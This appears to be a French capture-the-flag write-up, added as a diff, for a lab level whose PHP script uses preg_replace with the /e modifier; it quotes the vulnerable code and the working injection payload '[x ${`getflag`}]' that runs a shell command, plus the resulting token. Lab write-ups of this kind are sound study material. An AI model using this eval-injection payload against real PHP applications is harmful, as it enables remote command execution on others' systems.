@@ -1,0 +1,38 @@
+preg_replace() avec /e evalue le code
+sauf que le code c'est une string
+donc faut utiliser des variables avec ${} on sait pas trop pourquoi
+by using double quotes, you can include variables directly within the string
+
+Il y a un fichier level06.php et un executable lui correspondant:
+
+   #!/usr/bin/php
+   <?php
+   function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+   function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+   $r = x($argv[1], $argv[2]); print $r;
+   ?>
+
+La fonction preg_replace() remplace le pattern specifie en 1er argument par le second (ou le deuxieme au choix, ca depend de votre niveau d'elegance) argument dans la string en 3eme argument.
+Avec l'option /e, le contenu du deuxieme argument est evalue avant le remplacement.
+Evaluer signifie que le texte est considere comme du code executable.
+
+On peut voir dans ce code que le programme prend un argument (argv[1]) qui doit etre un fichier dont le contenu est lu.
+Si on analyse les regex des preg_replace, on observe que le code execute doit se trouver dans "[x code_execute]".
+Du coup, si l'on passe un fichier qui contient:
+
+ [x `getflag`]
+
+ca devrait executer la commande getflag avec le shell (utilisation des backticks)
+sauf que dans le code, le pattern est mis entre guillemets doubles, ce qui fait que les backticks sont interpretes de facon litterale.
+en cherchant, on a vu qu'a l'interieur de guillemets doubles, on peut integrer des variables qui seront evaluees avec la syntaxe ${variable}
+
+du coup, on a ecrit:
+
+ [x ${`getflag`}]
+
+le contenu de la variable est donc bien evalue comme l'execution de la fonction getflag ce qui donne une erreur a l'execution:
+
+   PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+     in /home/user/level06/level06.php(4) : regexp code on line 1
+
+et voila c'est bon, bien joue, youpi, hourra ! victoire !
